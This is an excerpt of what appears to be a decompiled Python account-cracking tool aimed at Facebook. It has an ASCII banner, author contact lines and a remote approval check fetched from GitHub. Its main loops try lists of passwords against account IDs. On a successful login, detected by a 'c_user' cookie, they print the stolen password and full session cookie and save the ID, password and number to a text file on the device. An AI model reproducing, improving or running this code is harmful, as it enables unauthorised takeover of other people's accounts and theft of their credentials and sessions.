#DECOMPILE BY BISHAL-VAI
#CREAT BY WAHID ISLAM BISHAL
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
...
def menu_apikey():
  ...
  id = "+∞".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/x10-BISHAL/ALL-APPROVAL-TOOLS-SETUP/blob/main/APPROVAL.txt').text
...
╚═════╝░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
 ...
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] AUTHOR   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mELAHID BISHAL              \033[1;93mA┃ \033[1;92mI┃ \033[1;91m3┃
 ...
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] FACEBOOK \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mMD BISHAL    \033[1;93mH┃ \033[1;92mN┃ \033[1;91mA┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] GITHUB   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mMD BISHAL         \033[1;93mI┃ \033[1;92mP┃ \033[1;91mB┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] WHATSAPP \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mNUMBER HIDE RAKHLAM         \033[1;93mJ┃ \033[1;92mQ┃ \033[1;91mC┃
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [x10-BISHAL>OK] '+cid+' |🧨| '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [🔢] Number : {uid}')
                print(f'\r\33[1;92m [😛] Bro Your Ok Id Just Naw Login')
                print(f'\r\033[1;92m [🎁] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/x10-BISHAL-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/x10-BISHAL-OK.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
